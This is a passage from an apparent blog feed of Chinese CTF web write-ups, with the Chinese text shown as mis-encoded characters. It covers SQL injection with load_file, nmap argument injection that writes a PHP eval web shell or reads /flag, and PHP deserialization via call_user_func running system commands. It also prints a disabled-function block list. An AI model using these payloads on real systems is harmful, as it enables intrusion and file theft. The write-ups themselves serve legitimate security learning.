<p>æŸ¥çœ‹æºç å‘ç°ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
<p>ç‚¹å‡»å¾—åˆ° flagã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
<h1 id="å…¶ä»–æ³¨å…¥æ–¹æ³•">å…¶ä»–æ³¨å…¥æ–¹æ³•</h1>
<p>æ³¨æ„åˆ°ï¼Œè·å–ç”¨æˆ·ä¿¡æ¯çš„æ—¶å€™å¾—åˆ°çš„æ˜¯ï¼š<code>root@localhost</code>ï¼Œrootæƒé™éå¸¸å¤§ï¼Œå› æ­¤å¯ä»¥å°è¯•ç›´æ¥è¯»å–flagæ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æºç ï¼Œç›´æ¥è·å¾— flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜è€ƒçš„åº”è¯¥æ˜¯ä¸¤æ¬¡æ³¨å…¥çš„è¿‡ç¨‹ï¼Œç¬¬ä¸€æ¬¡å¸¸è§„ï¼Œç¬¬äºŒæ¬¡ååºåˆ—åŒ–ã€‚ä¸è¿‡å¹³å¸¸åˆ·é¢˜ä¸­ä¹Ÿè¦æ³¨æ„ç”¨æˆ·çš„æƒé™é—®é¢˜ï¼Œè¿™é‡Œçš„ç”¨æˆ·æƒé™æˆ‘ç¡®å®æ²¡æƒ³åˆ°ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>sqlæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼æ¯ 2020 æœ±é›€ç»„ Nmap</title>
    <url>/2022/04/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20Nmap/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5Bç½‘é¼æ¯%202020%20æœ±é›€ç»„%5DNmap">ç½‘é¼æ¯ 2020 æœ±é›€ç»„ Nmap</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒå‘ç°å¦‚ä¸‹ç•Œé¢ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411162826.png" /></p>
<p>æ ¹æ®<code>nmap</code>çŒœæµ‹ï¼Œè¿™æ˜¯åå°è°ƒç”¨äº†<code>nmap</code>è„šæœ¬æ¥æ‰§è¡Œæˆ‘ä»¬åœ¨è¾“å…¥æ¡†è¾“å…¥çš„ã€‚ç»è¿‡æµ‹è¯•å‘ç°è®¸å¤šç¬¦å·åœ¨æ‰§è¡Œçš„æ—¶å€™éƒ½ä¼šåœ¨å‰é¢æ·»åŠ ä¸€ä¸ª<code>\</code>ï¼Œä¸‹å›¾ä¸­çš„<code>;</code>å‰é¢å°±è¢«æ·»åŠ äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411162937.png" /></p>
<p>å› æ­¤çŒœæµ‹åå°ä½¿ç”¨äº†<code>escapeshellarg + escapeshellcmd</code>ã€‚</p>
<p>æŸ¥çœ‹é¡µé¢æºç å‘ç°åœ¨æœ€ä¸‹é¢å‘ç°ä¸€ä¸ªæ³¨é‡Š<code>flag is in /flag</code>ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>å…³äº<code>escapeshellarg + escapeshellcmd</code>çš„çŸ¥è¯†å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™çš„<a href="https://hdfzzf.icu/2022/03/22/BUUCTF%202018%20Online%20Tool/?highlight=online">BUUCTF 2018 Online Tool</a></p>
<p>è¿™é‡Œæœ‰ä¸¤ç§è§£æ³•ï¼š</p>
<ol type="1">
<li>æ–¹æ³•_1</li>
</ol>
<p>ç›´æ¥ä½¿ç”¨<a href="https://hdfzzf.icu/2022/03/22/BUUCTF%202018%20Online%20Tool/?highlight=online">BUUCTF 2018 Online Tool</a>ä¸­çš„payloadï¼Œæç¤º<code>Hacker...</code>ã€‚çŒœæµ‹æ˜¯è¿‡æ»¤äº†<code>php</code>ï¼Œå› æ­¤ä¿®æ”¹ä¸ºå¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?= eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.phtml &#x27;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><code>&lt;?php</code>å¯ä»¥ç”¨<code>&lt;?=</code>ä»£æ›¿ <strong>çŸ­æ ‡ç­¾</strong></p>
</blockquote>
<p>è™½ç„¶æç¤ºäº†<code>Host maybe down</code>ï¼Œä½†æ˜¯å·²ç»è¢«æ‰§è¡Œäº†ã€‚ç›´æ¥è®¿é—®</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411164005.png" /></p>
<p>ç„¶åç”¨èšå‰‘è¿æ¥ï¼Œflagæ–‡ä»¶åœ¨æ ¹ç›®å½•ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411164108.png" /></p>
<ol start="2" type="1">
<li>æ–¹æ³•_2</li>
</ol>
<p>nmapå‘½ä»¤å¯ä»¥åˆ©ç”¨<code>-iL</code>è¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œç„¶åè¿›è¡Œæ‰«æã€‚æˆ‘ä»¬å†å°†æ‰«æçš„ç»“æœç”¨<code>-oN</code>å†™å…¥å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åç›´æ¥è®¿é—®è¯¥æ–‡ä»¶å³å¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &#x27;-iL /flag -oN exp.txt &#x27;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿæ˜¯ä¼šæç¤º<code>Host maybe down</code>ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥è®¿é—®ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411164248.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>RCE</tag>
        <tag>nmapå‘½ä»¤</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼æ¯ 2020 æœ±é›€ç»„ phpweb</title>
    <url>/2022/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20phpweb/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼š<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œä¼šå‘ç°5ç§’åè‡ªåŠ¨è·³è½¬åˆ° index.php é¡µé¢ï¼Œå¹¶ä¸”ä¹‹åæ¯5ç§’åˆ·æ–°ä¸€æ¬¡ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°åº”è¯¥æ˜¯å¦‚ä¸‹å‡½æ•°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(&quot;document.form1.submit()&quot;,5000)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230357.png" /></p>
<p>è¿™ä¸æ˜¯é‡ç‚¹ï¼Œæ¥ç€æˆ‘ä»¬æŠ“åŒ…</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230244.png" /></p>
<p>å‘ç° POST æäº¤äº†ä¸¤ä¸ªå‚æ•° <code>func</code> å’Œ <code>p</code> ã€‚ç»“åˆä¸Šé¢çš„è¡¨å•æ¶ˆæ¯æ¨æµ‹ï¼Œ<code>func</code> åº”è¯¥æ˜¯å‡½æ•°çš„æ„æ€ï¼Œè€Œ <code>p</code> åº”è¯¥æ˜¯ä¸€ä¸ªå‚æ•°ã€‚ï¼ˆä¸Šé¢è¡¨å•ä¸­çš„<code>p</code> æ˜¯æ—¶é—´çš„æ ¼å¼ï¼Œå¯èƒ½æ˜¯å‚æ•°ï¼‰</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>å°†å‡½æ•°éšä¾¿æ”¹ä¸€ä¸ªè¯•è¯•çœ‹ï¼ˆè¿™é‡Œ echo å¹¶ä¸æ˜¯å‡½æ•°ï¼Œä¸»è¦æƒ³çœ‹çœ‹æŠ¥é”™çš„ä¿¡æ¯ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230721.png" /></p>
<p>æ³¨æ„ <code>call_user_func()</code>ï¼Œè¿™å‡½æ•°çš„ä½œç”¨ç®€è€Œè¨€ä¹‹å°±æ˜¯è°ƒç”¨ä¸€ä¸ªPHPå‡½æ•°ï¼Œå¯ä»¥å¸¦å…¥å‚æ•°ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure></p>
<p>æ›´å¤šä¿¡æ¯è¯·å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/function.call-user-func.php">PHP_call_user_func</a></p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å°è¯•ç”¨ <code>file_get_contents()</code> è¯»å–ä¸€ä¸‹ <code>index.php</code> çš„å†…å®¹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327231040.png" /></p>
<p>å°†ä»£ç æ•´ç†å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œ<code>get time</code> ä¸­çš„ <code>call_user_func()</code> å‡½æ•°èƒ½å¤Ÿè°ƒç”¨çš„å‡½æ•°è¢«ç¦äº†å¥½å¤šï¼Œä½†æ˜¯è¿™ä¸æ˜¯é‡ç‚¹ï¼Œé‡ç‚¹æ˜¯ <code>Test</code> ç±»é‡Œé¢çš„ <code>__destruct</code> ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥è°ƒç”¨ <code>call_user_func()</code> è€Œä¸”æ˜¯ä¸ç»è¿‡éªŒè¯ã€‚å› æ­¤æ€è·¯å°±æ˜¯æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ä½œä¸º POST æäº¤çš„ <code>p</code> ï¼Œè€ŒPOST æäº¤çš„ <code>func</code> åˆ™ä¸º <code>unserialize</code>ã€‚</p>
<p>æ¥ä¸‹æ¥æ„é€  <code>p</code> ï¼ˆè¿™é‡Œçš„pæŒ‡çš„æ˜¯POSTæäº¤çš„ï¼Œè€Œä¸æ˜¯ç±»ä¸­çš„ï¼‰</p>
<blockquote>
<p>è¿™é‡Œç±»ä¸­çš„ var å…¶å®æ˜¯ public çš„åˆ«å</p>
</blockquote>
<p>ç¼–å†™ç®€å•çš„PHPè„šæœ¬ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;å‚æ•°&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>å‚æ•°ä¾æ¬¡å¦‚ä¸‹ï¼š <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls / # æŸ¥çœ‹æ ¹ç›®å½•</span><br><span class="line">2. ls   # æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class="line">3. find / -name flag* # æ‰¾flagæ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œä¼šæ‰¾åˆ°å¾ˆå¤šï¼Œä½†æ˜¯å…¶ä»–çš„ä¸€çœ‹å°±ä¸åƒ</span><br><span class="line">4. cat /tmp/flagoefiu4r93 # è¯»å–flag</span><br></pre></td></tr></table></figure></p>
<p>å°†ä¸Šé¢å‚æ•°å¸¦å…¥PHPè„šæœ¬ï¼Œç„¶åæ‰§è¡Œå¾—åˆ°çš„å­—ç¬¦ä¸²ä½œä¸º POST æäº¤çš„ pã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232126.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232212.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜éš¾åº¦å¹¶ä¸å¤§ï¼Œä¸»è¦çš„éš¾ç‚¹å°±åœ¨äºæŠ¥é”™æç¤ºçš„ <code>call_user_func()</code> ï¼Œè¦æ˜ç™½å®ƒçš„ä½œç”¨ã€‚æœ¬é¢˜è€ƒçš„å…¶å®æ˜¯PHPçŸ¥è¯†ç‚¹ï¼Œç†Ÿæ‚‰PHPä¸­çš„å‡½æ•°å°¤å…¶æ˜¯è°ƒç”¨ç³»ç»Ÿçš„å‘½ä»¤çš„å‡½æ•°ä»¥åŠååºåˆ—åŒ–çŸ¥è¯†ç‚¹ã€‚å‰è€…å…¶å®å¯ä»¥åœ¨ <strong>å‘½ä»¤æ‰§è¡Œ</strong> ç›¸å…³é¢˜ç›®ä¸­ç§¯ç´¯ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
</search>
